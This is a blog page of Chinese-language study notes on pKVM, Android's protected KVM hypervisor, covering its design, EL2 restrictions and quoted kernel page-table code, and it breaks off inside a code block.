<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"szy0127.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"preload":true}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="S blog">
<meta property="og:url" content="http://szy0127.github.io/index.html">
<meta property="og:site_name" content="S blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="szy">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://szy0127.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>S blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">S blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">szy</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2025/02/04/virtualization/PKVM/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/02/04/virtualization/PKVM/" class="post-title-link" itemprop="url">PKVM</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-02-04 20:49:57 / Modified: 20:54:18" itemprop="dateCreated datePublished" datetime="2025-02-04T20:49:57+08:00">2025-02-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/virtualization/" itemprop="url" rel="index"><span itemprop="name">virtualization</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>5.5k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>20 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="PKVM"><a href="#PKVM" class="headerlink" title="PKVM"></a>PKVM</h1><p>与传统的机密虚拟机区别的是 传统机密虚拟机用硬件加密保护内存 因此如果host恶意破坏 达到的只是DOS的目的</p>
<p>这并不在传统的机密虚拟机的威胁模型内</p>
<p>对于pkvm不利用硬件的机密虚拟机 必须保证页表完全在可信的EL2内完成</p>
<p><a target="_blank" rel="noopener" href="https://mirrors.edge.kernel.org/pub/linux/kernel/people/will/slides/kvmforum-2020-edited.pdf">https://mirrors.edge.kernel.org/pub/linux/kernel/people/will/slides/kvmforum-2020-edited.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://kvm-forum.qemu.org/2022/KVM%20forum%202022%20-%20pKVM%20deep%20dive.pdf">https://kvm-forum.qemu.org/2022/KVM%20forum%202022%20-%20pKVM%20deep%20dive.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://qemu-project.gitlab.io/kvm-forum/2022/NYSM-NYD-KVM-2022.pdf">https://qemu-project.gitlab.io/kvm-forum/2022/NYSM-NYD-KVM-2022.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/836693/">https://lwn.net/Articles/836693/</a></p>
<blockquote>
<p>When a new guest is created, its memory will be unmapped from the host, which is not something that Linux can deal with.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/835342/">https://lwn.net/Articles/835342/</a></p>
<h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjlkYmNmOWZlZjk4MmYyMTU4YWIxYTkzMzQyMTcyNWNfWkt1TkpaaERZNURteFA1R2FhcFBpRnU0MzlOUXJDb1NfVG9rZW46TTByYmJSenhpb2JYUUp4YWlZcWNGa2drbnhjXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA" alt="img"></p>
<ul>
<li>Extend world-switch code at EL2 to manage stage-2 page-tables and guest state ***</li>
<li>Install a stage-2 translation for the host kernel during boot before loading vendor modules *****</li>
<li>Message passing between host and VM ****</li>
<li>Template bootloader which accepts only signed VM images *</li>
<li>Formal verification techniques to reason about EL2 code *</li>
</ul>
<p>EL2可能会有的限制</p>
<ul>
<li>Not preemptible&#x2F;interruptible and unable to block&#x2F;schedule</li>
<li>Can access all of normal memory if mapped</li>
<li>Very limited device access; typically no console</li>
<li>Basically just context-switches EL1 and allows host kernel to run functions with elevated privilege</li>
<li>Tight coupling with host kernel</li>
</ul>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcxMWU3MjQ3NjRmODE0MTM0MWE4ZDgzZjNjZDVjMmZfbGZQbldPb0VRcjJndU9Nc2Q4cXJZanF1MHd1VElLRk9fVG9rZW46R2MzcGJWTTFUb1JER0N4NFo1b2NEc1Q5blZiXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA" alt="img"></p>
<p>关于页表必须在EL2操作</p>
<blockquote>
<p>lifting the page-table code to run directly at EL2 on a non-VHE system (as we plan to to do in future</p>
<p>patches) is practically impossible due to the number of dependencies it has on the core kernel.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://lore.kernel.org/all/20200911132529.19844-1-will@kernel.org/T/#u">https://lore.kernel.org/all/20200911132529.19844-1-will@kernel.org/T/#u</a></p>
<p>percpu有什么问题 之后再看</p>
<p>保护磁盘文件</p>
<p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/filesystems/fsverity.html">https://www.kernel.org/doc/html/latest/filesystems/fsverity.html</a></p>
<blockquote>
<p>A standard file hash could be used instead of fs-verity. However, this is inefficient if the file is large and only a small portion may be accessed. </p>
</blockquote>
<p>实际上大模型和推理框架的二进制文件只用两个hash就可以</p>
<p>VIRTIO_F_ACCESS_PLATFORM swiotlb&#x3D;force </p>
<blockquote>
<p>Expose SHARE&#x2F;UNSHARE hypercalls to the guest to update host stage-2.</p>
<p>Hook the set_memory_{decrypted,encrypted}() API to share&#x2F;unshare bounce buffer</p>
<p>pages</p>
</blockquote>
<p>SEV只需要改一个pte的bit即可加密 但是pkvm需要用hypercall 这边后续看看能否找到hook的代码 找不到手动加一下也不麻烦 参考这个</p>
<p><a target="_blank" rel="noopener" href="https://android-kvm.googlesource.com/linux/+/314641360847d8c84ceb913a4510521963eb6442%5E%21/#F5">https://android-kvm.googlesource.com/linux/+/314641360847d8c84ceb913a4510521963eb6442%5E%21/#F5</a></p>
<p><a target="_blank" rel="noopener" href="https://android-kvm.googlesource.com/linux/+/e7cf427f7b55583dd5be3752313765dd6fa4e4a1">https://android-kvm.googlesource.com/linux/+/e7cf427f7b55583dd5be3752313765dd6fa4e4a1</a></p>
<p><strong>pkvm-android-mainline-6.6 有这个代码</strong></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p><a target="_blank" rel="noopener" href="https://www.cl.cam.ac.uk/~pes20/Stuff/pkvm/notes37-2020-11-25-pkvm-code-overview.html#setup---stage-2-wrapping-the-host">https://www.cl.cam.ac.uk/~pes20/Stuff/pkvm/notes37-2020-11-25-pkvm-code-overview.html#setup---stage-2-wrapping-the-host</a></p>
<p><a target="_blank" rel="noopener" href="https://android-kvm.googlesource.com/linux/">https://android-kvm.googlesource.com/linux/</a></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVkZGVkMmEwNjE2YzI1ZDBmNTcxYjFlZTEwMGEzNWJfa2FaS3FMWmpNRm9IdmFTRXpNbW55emhCUTNVWHB2VmdfVG9rZW46R2t6VmJaVTFpb0YwcmR4WFY2d2Nzalo5bjZlXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA" alt="img"></p>
<h3 id="内存操作"><a href="#内存操作" class="headerlink" title="内存操作"></a>内存操作</h3><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWFiYThkODQ5YjY2NTQ0NWI2NmZkZDFkMDc5NjY2MDJfbUVkUEU2ZGVTSzBqYlV6bDA2SlJFektPdmk2bG9pUk1fVG9rZW46VzdWZGI1b2dubzNCcUZ4ZFNIRGNHbmNpblhiXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA" alt="img"></p>
<p>这个属性通过pkvm_getstate(kvm_pgtable_hyp_pte_prot(ctx-&gt;old));</p>
<p>放到pte中 用SW1和SW2保留位（bit55）</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">pkvm_page_state</span> &#123;</span><br><span class="line">    PKVM_PAGE_OWNED         = <span class="number">0ULL</span>,</span><br><span class="line">    PKVM_PAGE_SHARED_OWNED      = KVM_PGTABLE_PROT_SW0,</span><br><span class="line">    PKVM_PAGE_SHARED_BORROWED   = KVM_PGTABLE_PROT_SW1,</span><br><span class="line">    __PKVM_PAGE_RESERVED        = KVM_PGTABLE_PROT_SW0 |</span><br><span class="line">                      KVM_PGTABLE_PROT_SW1,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Meta-states which aren&#x27;t encoded directly in the PTE&#x27;s SW bits */</span></span><br><span class="line">    PKVM_NOPAGE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="kvm页表"><a href="#kvm页表" class="headerlink" title="kvm页表"></a>kvm页表</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">kvm_pgtable_walk</span><span class="params">(<span class="keyword">struct</span> kvm_pgtable *pgt, u64 addr, u64 size,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">struct</span> kvm_pgtable_walker *walker)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">kvm_pgtable_walk_data</span> walk_data = &#123;</span><br><span class="line">                .start        = <span class="built_in">ALIGN_DOWN</span>(addr, PAGE_SIZE),</span><br><span class="line">                .addr        = <span class="built_in">ALIGN_DOWN</span>(addr, PAGE_SIZE),</span><br><span class="line">                .end        = <span class="built_in">PAGE_ALIGN</span>(walk_data.addr + size),</span><br><span class="line">                .walker        = walker,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">        r = <span class="built_in">kvm_pgtable_walk_begin</span>(walker);</span><br><span class="line">        <span class="keyword">if</span> (r)</span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">        r = _kvm_pgtable_walk(pgt, &amp;walk_data);</span><br><span class="line">        <span class="built_in">kvm_pgtable_walk_end</span>(walker);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> __kvm_pgtable_visit(<span class="keyword">struct</span> kvm_pgtable_walk_data *data,</span><br><span class="line">                                      <span class="keyword">struct</span> kvm_pgtable_mm_ops *mm_ops,</span><br><span class="line">                                      <span class="type">kvm_pteref_t</span> pteref, s8 level)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">enum</span> <span class="title class_">kvm_pgtable_walk_flags</span> flags = data-&gt;walker-&gt;flags;</span><br><span class="line">        <span class="type">kvm_pte_t</span> *ptep = <span class="built_in">kvm_dereference_pteref</span>(data-&gt;walker, pteref);</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">kvm_pgtable_visit_ctx</span> ctx = &#123;</span><br><span class="line">                .ptep        = ptep,</span><br><span class="line">                .old        = <span class="built_in">READ_ONCE</span>(*ptep),</span><br><span class="line">                .arg        = data-&gt;walker-&gt;arg,</span><br><span class="line">                .mm_ops        = mm_ops,</span><br><span class="line">                .start        = data-&gt;start,</span><br><span class="line">                .addr        = data-&gt;addr,</span><br><span class="line">                .end        = data-&gt;end,</span><br><span class="line">                .level        = level,</span><br><span class="line">                .flags        = flags,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> reload = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">kvm_pteref_t</span> childp;</span><br><span class="line">        <span class="type">bool</span> table = <span class="built_in">kvm_pte_table</span>(ctx.old, level);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (table &amp;&amp; (ctx.flags &amp; KVM_PGTABLE_WALK_TABLE_PRE)) &#123;</span><br><span class="line">                ret = <span class="built_in">kvm_pgtable_visitor_cb</span>(data, &amp;ctx, KVM_PGTABLE_WALK_TABLE_PRE);</span><br><span class="line">                reload = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!table &amp;&amp; (ctx.flags &amp; KVM_PGTABLE_WALK_LEAF)) &#123;</span><br><span class="line">                ret = <span class="built_in">kvm_pgtable_visitor_cb</span>(data, &amp;ctx, KVM_PGTABLE_WALK_LEAF);</span><br><span class="line">                reload = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Reload the page table after invoking the walker callback for leaf</span></span><br><span class="line"><span class="comment">         * entries or after pre-order traversal, to allow the walker to descend</span></span><br><span class="line"><span class="comment">         * into a newly installed or replaced table.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (reload) &#123;</span><br><span class="line">                ctx.old = <span class="built_in">READ_ONCE</span>(*ptep);</span><br><span class="line">                table = <span class="built_in">kvm_pte_table</span>(ctx.old, level);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">kvm_pgtable_walk_continue</span>(data-&gt;walker, ret))</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!table) &#123;</span><br><span class="line">                data-&gt;addr = <span class="built_in">ALIGN_DOWN</span>(data-&gt;addr, <span class="built_in">kvm_granule_size</span>(level));</span><br><span class="line">                data-&gt;addr += <span class="built_in">kvm_granule_size</span>(level);</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        childp = (<span class="type">kvm_pteref_t</span>)<span class="built_in">kvm_pte_follow</span>(ctx.old, mm_ops);</span><br><span class="line">        ret = __kvm_pgtable_walk(data, mm_ops, childp, level + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">kvm_pgtable_walk_continue</span>(data-&gt;walker, ret))</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ctx.flags &amp; KVM_PGTABLE_WALK_TABLE_POST)</span><br><span class="line">                ret = <span class="built_in">kvm_pgtable_visitor_cb</span>(data, &amp;ctx, KVM_PGTABLE_WALK_TABLE_POST);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">kvm_pgtable_walk_continue</span>(data-&gt;walker, ret))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">kvm_pgtable_visitor_cb</span><span class="params">(<span class="keyword">struct</span> kvm_pgtable_walk_data *data,</span></span></span><br><span class="line"><span class="params"><span class="function">                                  <span class="type">const</span> <span class="keyword">struct</span> kvm_pgtable_visit_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">                                  <span class="keyword">enum</span> kvm_pgtable_walk_flags visit)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">kvm_pgtable_walker</span> *walker = data-&gt;walker;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Ensure the appropriate lock is held (e.g. RCU lock for stage-2 MMU) */</span></span><br><span class="line">        <span class="built_in">WARN_ON_ONCE</span>(<span class="built_in">kvm_pgtable_walk_shared</span>(ctx) &amp;&amp; !<span class="built_in">kvm_pgtable_walk_lock_held</span>());</span><br><span class="line">        <span class="keyword">return</span> walker-&gt;<span class="built_in">cb</span>(ctx, visit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="donate"><a href="#donate" class="headerlink" title="donate"></a>donate</h4><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/arch/arm64/kvm/hyp/nvhe/mem_protect.c">https://github.com/torvalds/linux/blob/master/arch/arm64/kvm/hyp/nvhe/mem_protect.c</a></p>
<p>__pkvm_owner1_donate_owner2</p>
<p>把owner1的内存给owner2</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span 